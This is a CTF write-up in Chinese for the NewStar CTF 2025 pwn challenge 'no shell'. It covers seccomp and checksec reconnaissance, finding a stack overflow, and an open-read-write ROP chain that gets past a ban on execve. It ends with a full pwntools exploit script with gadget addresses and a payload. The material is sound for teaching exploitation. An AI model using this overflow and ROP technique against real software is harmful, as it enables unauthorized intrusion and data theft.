---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

<script setup>
import Container from '@/components/docs/Container.vue'
</script>

# no shell

<Container type='info'>

本题考查沙箱与 ROP.
</Container>

参考链接

- [Linux沙箱之seccomp介绍 | arch3rn4r](https://arch3rn4r.github.io/2024/09/21/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp%E4%BB%8B%E7%BB%8D/)
- [ROP入门 - Hello CTF](https://hello-ctf.com/hc-pwn/ROP/)

在对一个 pwn 附件进行逆向分析前，挑战者不得不去获取一些其他的信息。

需要的工具有：checksec 和 seccomp-tools，前者在安装 pwntools 的时候就会附带，后者则需要独立安装，在 Ubuntu 环境下，安装可参考：

```sh
sudo apt install gcc ruby-dev
sudo gem install seccomp-tools
```

## 预处理

在安装好工具后，就来到了预处理环节，也就是获取“其他信息“。

![信息收集](/assets/images/wp/2025/week2/no-shell_1.png)

`check` 下可以看到程序的一些基础信息：

- amd64 架构, 64 位, 小端序<span data-desc>（little）</span>
- No canary, 没有 canary 保护
- No PIE, 没有 PIE 保护

其他的属性可以不关心。

至于 seccomp-tools，得知程序不允许使用 `execve` 系统调用<span data-desc>（是的，就是 ret2syscall 中那个系统调用）</span>，`system` 因此无法使用。

## 逆向分析

![逆向分析](/assets/images/wp/2025/week2/no-shell_2.png)

`init` 然后是一大堆输出。

有 3 个输入点，第一个是在第 11 行的 `getchar`，第二个是 13 行的 `read`，第三个是 21 行的 `scanf`，但是都没办法溢出

在 `init` 中，初始化了流，进行了 `sandbox`，初始了 `off` 变量为 16。

![初始化](/assets/images/wp/2025/week2/no-shell_3.png)

经过了前面的一系列操作后，来到了本题的重点，`challenge` 函数

### challenge

![功能点](/assets/images/wp/2025/week2/no-shell_4.png)

有 5 个功能。

#### 1. Check your power

输出 `off`，输入一些东西。

![check your power](/assets/images/wp/2025/week2/no-shell_5.png)

#### 2. Get the power of your cat

设置 `off` 为 256。

![Get the power of your cat](/assets/images/wp/2025/week2/no-shell_6.png)

#### 3. Open the door

打开 `flag.txt`，然后关闭。

![Open the door](/assets/images/wp/2025/week2/no-shell_7.png)

#### 4. Destroy this world

删除 flag 或者 `system("/bin/sh")`。

![Destroy this world](/assets/images/wp/2025/week2/no-shell_8.png)

当然，由于沙箱机制，这俩个操作都不会成功，反而会让程序崩溃。

#### 5. leave this world

退出程序。

## 漏洞分析

在以上梳理后，漏洞相当明显，先设置 `off` 为 256，再输入，就能溢出返回地址。

至于 ROP 构造，由于不能构造 `system("/bin/sh")`，所以得使用 [orw](https://www.cnblogs.com/falling-dusk/p/18101528)。

`open` 有俩参数，要控制 `rdi` 和 `rsi` 寄存器。

`read` 和 `write` 有三个参数，要控制 `rdi`，`rsi`，`rdx` 寄存器。

```python
fd = open('flag',0)         # 注意，是 flag 不是 flag.txt
read(fd,buf,0x40)
write(1,buf,0x40)
```

![ROPgadget](/assets/images/wp/2025/week2/no-shell_9.png)

`pop rdi`，`pop rsi`，`pop rdx`，还有一个非常关键的 `mov rdi, rax` 用于传递返回值，形似于这样的 rop 链。

![rop 链](/assets/images/wp/2025/week2/no-shell_10.png)

在下面的 EXP 中，`rax` 指代 `mov rdi, rax ; ret` 所在的地址

`rdi`，`rsi`，`rdx` 指代 `pop rdi/rsi/rdx ; ret` 所在的地址

## exp

```python
from pwn import *

context.binary = elf = ELF('./noshell')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

io = process(elf.path)
# gdb.attach(io, gdbscript='b *0x401460')

io.recvuntil(b'Do you want to say something?\n')
io.sendline(b'yes')

io.recvuntil(b'leave or capture the flag?\n')
io.sendline(b'2')

io.recvuntil(b'your choice: ')
io.sendline(b'2')

io.recvuntil(b'your choice: ')
io.sendline(b'1')


rdi = 0x4013f3
rsi = 0x4013f5
rdx = 0x4013f7
rax = 0x4013f9

open_addr = 0x4011E0
read_addr = 0x4011B4
write_addr = 0x401144

payload = flat(
    b'A' * 0x28,
    rdi,
    0x40206B-1,
    rsi,
    0,
    open_addr,
    rax,
    rsi,
    0x404300,
    rdx,
    0x50,
    read_addr,
    rdi,
    0x404300,
    write_addr,
)

io.sendline(payload)

io.interactive()
```
